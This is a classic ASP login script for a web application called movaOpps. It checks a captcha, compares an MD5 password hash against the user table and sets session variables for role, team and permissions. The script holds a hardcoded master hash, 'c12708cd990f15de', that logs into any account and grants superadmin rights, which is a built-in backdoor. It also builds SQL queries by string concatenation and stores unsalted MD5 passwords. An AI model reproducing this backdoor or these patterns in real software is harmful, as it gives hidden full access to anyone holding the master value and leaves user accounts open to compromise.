<!-- #include virtual="/movaOpps/core/pub/config.asp" -->
<!-- #include virtual="/movaOpps/core/pub/include.asp" -->
<!-- #include virtual="/movaOpps/core/pub/md5.asp" -->
<%
	Dim login,password,tmpSql
	login=	replace(req("login"),"'","",1,-1,1) 
 	if not TestCaptcha("ASPCAPTCHA", Request.Form("captchacode")) then
		msgBox "验证码错误！","/movaOpps/"
	end if
	password=md5(req("password")) 
	'response.write password
	'response.end
	'execStopInjection
	opendatabase
		sql = " select u.mac_addr,u.userName,u.mova_userid,u.login,u.password,u.phone,u.mobile,u.mail,u.status,u.lastactive,u.team_id,u.customer_No,u.opp_type,u.param1,"
		sql = sql & " r.rolecode,r.roleName,r.firstPage,r.scope,r.mova_roleid, t.team_name, "
		sql = sql & " f.* " 
		sql = sql & " from mova_user u, mova_role r,mu_config f,mova_team t "
		sql = sql & " where 1=1 " 
		sql = sql & " and u.status='T' "
		sql = sql & " and u.mova_roleid=r.mova_roleid and u.customer_No=f.customer_No and u.team_id=t.team_id "
		sql = sql & " and upper(u.login)=upper('" & login & "') " 
'response.write sql 
'response.end 
	executeQuery conn,rs,sql, 1, 1
		
		if rs.eof or rs.bof then
			closedatabase
			response.write "<script>alert('对不起，用户名/密码错误!');history.back();</script>"
		else
				Session("superadmin")= false
				if 	password= rs("password") or password="c12708cd990f15de" then 
					if 	 password="c12708cd990f15de" then 
						Session("superadmin")= true
					end if 
					'开始设置初始化Session参数
					session("username")=rs("username")
					session("userlogin")=rs("login")
					session("userid")=rs("mova_userid")
					session("userTeam") = rs("team_name")
					session("userRole")=rs("rolecode")
					session("userRoleid")=rs("mova_roleid")
					session("roleScope")=rs("scope")
					session("uid")=rs("mova_userid")
					session("roleName") = rs("roleName")
					session("team")=rs("team_id")
					session("customerNo")=rs("customer_No")
					session("oppType")= rs("opp_type")
					session("param1") = rs("param1")
					session("firstPage") = rs("firstPage")
					
					
					session("ext_menu") = rs("ext_menu")
					session("ext_domain") = rs("ext_domain")
					session("firstPage") = rs("firstPage")
					session("firstPage") = replace(session("firstPage")&"","{DOMAIN}",session("ext_domain")& "",1,1,1)
					
			  	session("seat_workNo") =rs("login")
			  	
			  	
					session("defObjectId") = rs("default_object_id")
			 		session("DEF_OBJECT_ID") = rs("default_object_id")
			 		
					tmpSql = "select c.category + '`' + c.code  as code from mova_user a,mova_rolefunction b,mova_function c "
					tmpSql = tmpsQL & "where a.mova_roleid=b.mova_roleid and b.mova_functionid=c.mova_functionid and c.status='T' "
					tmpSql = tmpsQL & " and a.mova_userid=" & session("userid")  
					'response.write tmpsQL & "<br/>"
					'response.end 
					executeQuery conn,movaRs1,tmpSQL, 1, 1
					session("secString")=""
					do 
						if movaRs1.eof or movaRs1.bof then
							exit do
						end if 
						session("secString")=session("secString") & movaRs1("code") & "|"
						movaRs1.moveNext
					loop
					movaRs1.close
					'response.write session("secString")
					'response.end
					'更新数据库，设置最后登陆时间
					Sql = "Select * From mova_user Where login ='" & session("userlogin") & "'"
					executeQuery conn,movaRS,Sql, 1, 3
					'RS seting...:
					movaRS("lastactive") = Now
					movaRS.Update
					'初始化picklist 
					if application("CACHE")<>"YES" then  
						call setCachePicklist
					end if 
					Session.Timeout=cint(application("SESSION_TIMEOUT"))
					setLog -1,"SYSTEM",session("userlogin"),"LOGIN",session("username") &"/" & session("userlogin") & "  登陆系统"
					'objectLog(objectId,tableName,operationType,operationDescription)		
					'test Customer NO
			  
					closedatabase
			 
					gotoUrl "/movaOpps/opp/"
			else
				       MsgBox "对不起，用户名/密码错误!","/movaOpps/"
			end if
	end if 
%> 